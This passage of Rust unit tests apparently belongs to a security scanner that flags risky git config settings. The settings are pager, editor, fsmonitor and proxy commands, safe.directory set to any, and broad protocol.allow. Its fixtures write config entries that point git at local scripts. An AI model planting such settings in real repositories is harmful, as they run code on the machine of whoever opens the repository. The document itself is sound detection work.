        let (f, _) = scan_git_config_with(
            &ScanContext::new(),
            Some(&home),
            &dirs,
            std::slice::from_ref(&system),
        );
        let ids: Vec<_> = f.iter().map(|x| x.id.as_str()).collect();
        assert!(ids.contains(&"git-config-pager-command"), "{ids:?}");
        assert!(ids.contains(&"git-config-editor-command"), "{ids:?}");
        assert!(ids.contains(&"git-config-fsmonitor-command"), "{ids:?}");
        assert!(ids.contains(&"git-config-proxy-command"), "{ids:?}");
        assert!(ids.contains(&"git-config-safe-directory-any"), "{ids:?}");
        // The worktree and the main checkout share one config: reported once.
        assert_eq!(
            ids.iter()
                .filter(|i| **i == "git-config-pager-command")
                .count(),
            1,
            "{ids:?}"
        );
    }

    #[test]
    fn test_launch_follow_ups_protocol_override_scope_and_user_includes() {
        let home = tmp();
        let repo = home.join("projects/app");
        // protocol.ext.allow = never overrides a broad protocol.allow in the same file.
        w(&repo.join(".git/config"), "[protocol]\n\tallow = always\n[protocol \"ext\"]\n\tallow = never\n[include]\n\tpath = ~/.gitconfig-work\n");
        w(
            &repo.join(".git/modules/lib/config"),
            "[core]\n\tbare = false\n",
        );
        // A user's own file pulled in by a repo include is the user's config, not the repo's.
        w(
            &home.join(".gitconfig-work"),
            "[core]\n\tpager = ./p.sh\n\tfsmonitor = ~/fsmon.sh\n",
        );
        let (f, i) = scan_git_config_with(
            &ScanContext::new(),
            Some(&home),
            std::slice::from_ref(&repo),
            &[],
        );
        assert!(
            !f.iter().any(|x| x.id == "git-config-protocol-ext"),
            "{f:?}"
        );
        let inc = by(&f, |x| x.id == "git-config-fsmonitor-command");
        assert_eq!(inc.severity, Severity::Medium, "{inc:?}");
        // A user file is not judged by repo-only rules (pager).
        assert!(
            !f.iter().any(|x| x.id == "git-config-pager-command"),
            "{f:?}"
        );
        // One repo, even with a submodule config.
        assert!(format!("{i:?}").contains("proj (1 repo)"), "{i:?}");
    }

    #[test]
    fn test_not_selected() {
        let ctx = ScanContext::new().with_categories(vec![Category::Garbage]);
        let (f, i) = scan_git_config_with(&ctx, Some(&tmp()), &[], &[]);
        assert!(f.is_empty());
        assert!(i
            .iter()
            .all(|x| matches!(x.status, InspectionStatus::Skipped { .. })));
    }
}
